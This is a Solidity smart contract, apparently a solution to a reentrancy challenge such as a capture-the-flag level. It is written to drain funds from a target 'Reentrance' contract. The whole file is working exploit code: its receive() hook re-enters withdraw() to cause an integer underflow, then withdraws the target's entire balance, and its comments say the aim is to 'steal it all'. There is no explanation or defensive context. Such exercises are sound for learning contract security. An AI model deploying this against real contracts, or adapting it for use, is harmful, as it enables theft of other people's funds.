// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "./Reentrancy.sol";

contract ReentranceExploit {
    address payable private target;
    uint256 private amount;
    bool private exploited;

    event Withdraw(uint256 _amount);

    function run(address payable _target) external payable {
        target = _target;
        amount = msg.value;
        exploited = false;
        Reentrance(target).donate{value: amount}(address(this)); // having some balance is required
        Reentrance(target).withdraw(amount);
    }

    receive() external payable {
        if (!exploited) {
            exploited = true;
            emit Withdraw(amount);
            Reentrance(target).withdraw(amount); // single recursive call to create the integer underflow
        } else {
            emit Withdraw(target.balance);
            Reentrance(target).withdraw(target.balance); // underflowed value should now be larger than the total contract balance so we can steal it all at once
        }
    }
}
